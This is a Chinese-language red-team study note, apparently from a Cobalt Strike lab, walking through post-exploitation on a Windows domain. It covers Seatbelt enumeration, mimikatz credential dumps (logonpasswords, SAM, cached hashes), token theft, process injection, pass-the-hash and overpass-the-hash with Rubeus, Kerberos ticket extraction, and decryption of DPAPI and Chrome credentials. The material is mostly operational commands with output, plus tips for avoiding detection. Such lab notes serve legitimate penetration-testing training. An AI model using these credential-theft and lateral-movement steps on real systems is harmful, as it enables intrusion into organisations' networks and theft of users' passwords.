# Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt)是一个c#编写的用于主机探测的工具

什么是Common Language Runtime (CLR)？
.NET Framework 的一个组件，用于管理 .NET 程序集的执行，每个 .NET Framework 版本都设计为在特定版本的 CLR 上运行


枚举.NET Framework版本
```
beacon> reg queryv x64 HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full Release

Release                  460805
```

execute-assembly命令允许 Beacon 直接从内存运行 .NET 可执行文件，因此（一般而言）无需在运行这些工具之前将它们上传到磁盘
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=system
```

上面命令会产生大量输出，在安全配置方面主要留意下面的内容
```
====== AppLocker ======
[*] Applocker is not running because the AppIDSvc is not running

====== LAPS ======
LAPS Enabled                  : True

====== OSInfo ======
IsLocalAdmin                  :  False

====== PowerShell ======
Script Block Logging Settings
Enabled                       : True

====== Services ======
Non Microsoft Services (via WMI)

Name                          : Sysmon64
BinaryPath                    : C:\Windows\Sysmon64.exe
FileDescription               : System activity monitor

====== Sysmon ======
ERROR: Unable to collect. Must be an administrator.

====== UAC ======
[*] LocalAccountTokenFilterPolicy == 1. Any administrative local account can be used for lateral movement.

====== WindowsFirewall ======
Domain Profile
  Enabled                  : False

Private Profile
  Enabled                  : False

Public Profile
  Enabled                  : False
```


枚举用户环境变量
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe -group=user
```

这个映射的驱动器条目向我们展示了用户配置文件放在远程共享上
```
Mapped Drives (via WMI)

  LocalName                      : H:
  RemoteName                     : \\dc-2\home$\bfarmer
  RemotePath                     : \\dc-2\home$\bfarmer
  Status                         : OK
  ConnectionState                : Connected
  Persistent                     : False
  UserName                       : DEV.CYBERBOTIC.IO\bfarmer
  Description                    : RESOURCE CONNECTED - Microsoft Windows Network
```

# Get-NetSession

powerview返回本地（或远程）机器的会话信息（其中CName是源IP）
```
beacon> powershell Get-NetSession -ComputerName dc-2 | select CName, UserName

CName          UserName
-----          --------
\\10.10.17.231 bfarmer 
\\10.10.17.132 nlamb   
```


net logons将显示当前登录到主机的所有用户

```
beacon> net logons
Logged on users at \\localhost:

DEV\SRV-1$
DEV\jking
DEV\svc_mssql
```

也可以通过ps命令查看登录过本机的用户（开启的进程）
```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
[...snip...]
2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql
```




# LogonPasswords

导出内存中的密码，有可能出现明文密码，但是可能性比较小。需要本地管理员权限
```
beacon> mimikatz sekurlsa::logonpasswords
```

上面命令在Cobalt Strike里的缩写

```
logonpasswords
```

# eKeys

这个 Mimikatz 模块将转储 Kerberos 加密密钥。

这个Mimikatz模块将转储Kerberos加密密钥。由于大多数Windows服务选择使用Kerberos而不是NTLM，利用这些比NTLM的哈希值更有意义，可以混入正常的认证流量。

以下命令需要本地管理员权限

```
beacon> mimikatz sekurlsa::ekeys
```


# Security Account Manager

 (SAM) 数据库仅保存本地帐户的 NTLM 哈希

 下面命令需要本地管理员权限
```
 beacon> mimikatz lsadump::sam
```


# Domain Cached Credentials

域缓存凭据

Domain Cached Credentials 的设计初衷是计算机离线以后还可以继续登录机器，可以离线提取和破解这些凭据以获得明文密码

注意：这里的哈希格式不是ntlm

```
beacon> mimikatz lsadump::cache

Domain : SRV-1
SysKey : 5d11b46a92921b8775ca574306ba5355

Local name : SRV-1 ( S-1-5-21-4124990477-354564332-720757739 )
Domain name : DEV ( S-1-5-21-3263068140-2042698922-2891547269 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.14
LSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}
  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983

* Iteration is set to default (10240)

[NL$1 - 2/25/2021 1:07:37 PM]
RID       : 00000460 (1120)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 5/17/2021 2:00:46 PM]
RID       : 0000046e (1134)
User      : DEV\svc_mssql
MsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6

[NL$3 - 5/17/2021 2:00:50 PM]
RID       : 00000462 (1122)
User      : DEV\jking
MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
```

可以使用hashcat破解上面的哈希，例子见[这里](https://hashcat.net/wiki/doku.php?id=example_hashes)


# Make Token

Cobalt Strike中的```make_token```命令使用[LogonUserA](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API，该API接收用户的用户名、域和明文密码以及登录类型。make_token传递LOGON32_LOGON_NEW_CREDENTIALS类型，MS文档中描述为：

>This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections.


使用场景：
bfarmer是srv-1计算机的管理员

bfarmer不是srv-2计算机的管理员

bfarmer现在不能登录srv-2计算机

jking是srv-2计算机的管理员

jking曾经在srv-1计算机登录(因此在srv-1中留有登录的token)

此时，bfarmer用户可以使用```make_token```命令（需要jking的明文密码）利用jking的身份克隆token登录B计算机（但是getuid显示还是bfarmer的身份）

```
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer
```

```
beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
```

# Process Injection

就是msf里的进程迁移

可以迁移当前用户的任意进程

迁移到其他用户的进程需要admin权限

```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking

beacon> inject 3320 x64 tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

参数解释
```
3320 is the PID of the target process.

x64 is the architecture of that process.

tcp-4444-local is the name of the listener.
```

不要进行跨架构迁移，例如 x86 -> x64 或 x64 -> x86


# Token Impersonation

```steal_token```命令将模拟目标进程的访问令牌

和make_token一样，它适用于跨网络的资源访问，但不适用于本地操作。

使用```rev2self```来释放模拟的token

```
beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> steal_token 3320
[+] Impersonated DEV\jking

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin

beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes
```

# SpawnAs


```spawnas```命令将使用用户的明文密码生成一个新进程，并将 Beacon 有效负载注入其中

会在磁盘上创建整个用户配置文件

```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

一个常见的错误是，在某个目录下没有写权限
```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[-] could not run C:\Windows\system32\rundll32.exe as DEV\jking: 267
[-] Could not connect to target
```
这种情况换一个有写权限的目录


此命令不需要本地管理员权限，就算是system账号运行，此命令也有可能会失败。

# Pass the Hash

Beacon 有一个专门的```pth```命令，可以在后台执行 Mimikatz

```
beacon> pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e
```

手动执行 Mimikatz
```
beacon> mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
```

上面的命令如果没有指定```/run```参数，则会弹出一个cmd.exe的窗口，这有可能会暴露自己，有违红队原则。

使用```/run```或者```powershell -w hidden```来隐藏创建的窗口

一旦pth的进程被创建，再使用steal_token来窃取身份

```
beacon> steal_token 6284
[+] Impersonated NT AUTHORITY\SYSTEM
```

使用```rev2self```和```kill```命令结束上面的进程
```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes

beacon> kill 6284
[*] Tasked beacon to kill 6284
[+] host called home, sent: 12 bytes
```


# Overpass the Hash

[Rubeus](https://github.com/GhostPack/Rubeus)允许我们在不需要提升权限的情况下执行 opth

步骤如下：
1. 为我们要模拟的用户创建一个TGT
2. 创建一个登陆会话
3. 将 TGT 传递到该登录会话中
4. 访问目标机器

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap
```


Rubeus 也有一个```/opsec```参数，在没有预授权的情况下发送请求，以更接近地模拟真正的 Kerberos 流量

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec
```


使用 ```klist``` (or ```execute-assembly Rubeus klist```) 列出所有 Kerberos tickets

```
beacon> run klist
```

使用```make_token```和一个假密码来创建和冒充一个新的登录会话

```
beacon> make_token DEV\jking DummyPass
[+] Impersonated DEV\bfarmer

beacon> run klist

Current LogonId is 0:0x785927

Cached Tickets: (0)
```


在靶机上把jkingTGT.kirbi转成base64
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
```

在kali上根据上面的base64重新生成jkingTGT.kirbi
```
root@kali:~# echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
```

使用```kerberos_ticket_use```命令传递TGT

```
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
```

如果当前shell在特权上下文中，rebuse还可以省略一些利用步骤

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

[*] Action: Ask TGT
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3044
[+] LUID            : 0x85a103

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Target LUID : 8757507
[+] TGT request successful!
[*] base64(ticket.kirbi):

      [...ticket...]

[*] Target LUID: 0x85a103
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jking
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/4/2021 12:48:16 PM
  EndTime               :  3/4/2021 10:48:16 PM
  RenewTill             :  3/11/2021 12:48:16 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=

beacon> steal_token 3044
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
```


# Extracting Kerberos Tickets

从内存中提取TGT


列出内存中的TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------------ 
 | LUID    | UserName                     | Service                                       | EndTime               |
 ------------------------------------------------------------------------------------------------------------------ 
 | 0x462eb | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:34:03 AM |
 | 0x25ff6 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:33:41 AM |
 ------------------------------------------------------------------------------------------------------------------
```

使用 ```/service``` 和 ```/luid```参数限制提取的TGT的数量和类型
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
```

使用```createnetonly ```命令创建一个登陆会话，并且记下新的LUID
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4872
[+] LUID            : 0x92a8c
```

现在使用ptt，指定LUID，把tiket传递到指定会话中
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

[*] Action: Import Ticket
[*] Target LUID: 0x92a8c
[+] Ticket successfully imported!
```

窃取该进程的访问令牌并访问目标资源

```
beacon> steal_token 4872
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
```


# Data Protection API

Data Protection API是windows里面的一个组件，被windows管理器用来加解密各种用户凭据，比如RDP等。

谷歌浏览器也会用DPAPI保存网站的用户凭据。

# Credential Manager
credential manager blobs存储在```AppData```目錄

```
 beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 372b     fil     02/25/2021 13:07:38   9D54C839752B38B233E5D56FDD7891A7
 10kb     fil     02/21/2021 11:49:40   DFBE70A7E5CC19A398EBF1B96859CE5D
```


 使用windows自带的vaultcmd命令可以列出
```
 beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

 或者mimikatz
```
 beacon> mimikatz vault::list
```
要解密凭据，需要找到```master encryption key```

执行```dpapi::cred```,指定要解密的凭据路径
```
 beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7

BLOB
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {a23a1631-e2ca-4805-9f2f-fe8966fd8698}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006603 - 26115 (CALG_3DES)
  dwAlgCryptLen      : 000000c0 - 192
  dwSaltLen          : 00000010 - 16
  pbSalt             : f8fb8d0f5df3f976e445134a2410ffcd
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 00008004 - 32772 (CALG_SHA1)
  dwAlgHashLen       : 000000a0 - 160
  dwHmac2KeyLen      : 00000010 - 16
  pbHmack2Key        : e8ae77b9f12aef047664529148beffcc
  dwDataLen          : 000000b0 - 176
  pbData             : b8f619[...snip...]b493fe
  dwSignLen          : 00000014 - 20
  pbSign             : 2e12c7baddfa120e1982789f7265f9bb94208985
```

guidMasterKey包含解密所需密钥的 GUID，上面是：```a23a1631-e2ca-4805-9f2f-fe8966fd8698```

```pbData```就是我们要解密的内容

也可以在这个目录```AppData\Roaming\Microsoft\Protect```上找到GUID
> The Master Key information is stored within the user's AppData\Roaming\Microsoft\Protect directory (where S-1-5-21-* is their SID).

```
 beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 740b     fil     02/21/2021 11:49:40   a23a1631-e2ca-4805-9f2f-fe8966fd8698
 928b     fil     02/21/2021 11:49:40   BK-DEV
 24b      fil     02/21/2021 11:49:40   Preferred
```



知道了GUID，利用mimikatz获取masterkey，需要system或管理员权限
```
 beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-3263068140-2042698922-2891547269-1120\a23a1631-e2ca-4805-9f2f-fe8966fd8698 /rpc

[domainkey] with RPC
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
  key : 0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df
  sha1: e3d7a52f1755a35078736eecb5ea6a23bb8619fc
```

上面的key就是解密需要的masterkey

解密凭据，得到明文密码：```Sup3rman```
```
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\9D54C839752B38B233E5D56FDD7891A7 /masterkey:0c0105785f89063857239915037fbbf0ee049d984a09a7ae34f7cfc31ae4e6fd029e6036cde245329c635a6839884542ec97bf640242889f61d80b7851aba8df

Decrypting Credential:
 [...snip...]
  UserName       : DEV\bfarmer
  CredentialBlob : Sup3rman
```

在上面的例子中，bfarmer是SRV-1的本地管理员，所以他们只是保存了自己的域凭证。值得注意的是，即使他们有本地凭证，甚至保存了一套不同的域凭证，解密的过程也是完全一样的。


# Google Chrome

Chrome的用户凭据也是存放在```AppData```目录
```
beacon> ls C:\Users\bfarmer\AppData\Local\Google\Chrome\User Data\Default

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 40kb     fil     02/25/2021 13:21:18   Login Data
```

可以使用[SharpChromium](https://github.com/djhohnstein/SharpChromium)破解里面的密码

```
beacon> execute-assembly C:\Tools\SharpChromium\bin\Debug\SharpChromium.exe logins

[*] Beginning Google Chrome extraction.

--- Chromium Credential (User: bfarmer) ---
URL      : 
Username : bfarmer
Password : Sup3rman

[*] Finished Google Chrome extraction.
[*] Done.
```